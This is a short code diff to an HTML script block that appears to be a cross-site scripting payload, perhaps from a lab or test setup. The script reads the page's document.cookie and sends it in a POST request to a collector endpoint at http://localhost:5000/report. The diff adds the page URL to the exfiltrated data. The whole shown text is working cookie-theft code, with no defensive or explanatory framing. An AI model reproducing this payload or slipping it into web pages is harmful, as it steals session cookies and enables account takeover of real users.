@@ -7,12 +7,13 @@
     <script>
         // Capture cookies
         var cookies = document.cookie;
+        var targetUrl= "http://localhost:5000";
         
         // Send a POST request with the cookies
         fetch("http://localhost:5000/report", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams({ cookies: cookies })
+            body: new URLSearchParams({ cookies: cookies, url: targetUrl })
         }).catch(error => {
             console.error("Failed to send cookies:", error);
         });
